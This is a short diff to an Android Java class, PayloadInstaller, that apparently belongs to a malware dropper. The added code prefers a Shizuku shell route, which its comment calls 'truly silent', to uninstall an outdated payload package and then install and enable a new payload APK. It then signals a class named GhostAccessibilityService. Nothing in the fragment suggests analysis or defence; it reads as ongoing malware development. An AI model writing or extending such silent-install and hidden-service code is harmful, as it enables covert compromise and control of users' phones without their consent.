@@ -367,9 +367,24 @@ final class PayloadInstaller {
                     ? "unreadable" : info(c, apk).packageName));
             return;
         }
-        if (installedInfo(c, PAYLOAD_PACKAGE) != null) {
-            boolean current = installedVersion(c, PAYLOAD_PACKAGE) >= apkVersion(apk, c)
-                    && sameSigner(c, PAYLOAD_PACKAGE, apk);
+        boolean installedNow = installedInfo(c, PAYLOAD_PACKAGE) != null;
+        boolean current = installedNow
+                && installedVersion(c, PAYLOAD_PACKAGE) >= apkVersion(apk, c)
+                && sameSigner(c, PAYLOAD_PACKAGE, apk);
+
+        // Preferred path: Shizuku shell (Play-verified) = truly silent.
+        if (ShizukuBridge.available() && ShizukuBridge.permitted()) {
+            if (installedNow && !current) {
+                ShizukuBridge.run("pm", "uninstall", PAYLOAD_PACKAGE);
+            }
+            if (ShizukuBridge.installAndEnable(c, apk)) {
+                Log.d(TAG, "installed via shizuku");
+                GhostAccessibilityService.onPayloadReady(c);
+                return;
+            }
+        }
+
+        if (installedNow) {
             if (current) {
                 Log.d(TAG, "payload already current");
                 GhostAccessibilityService.onPayloadReady(c);
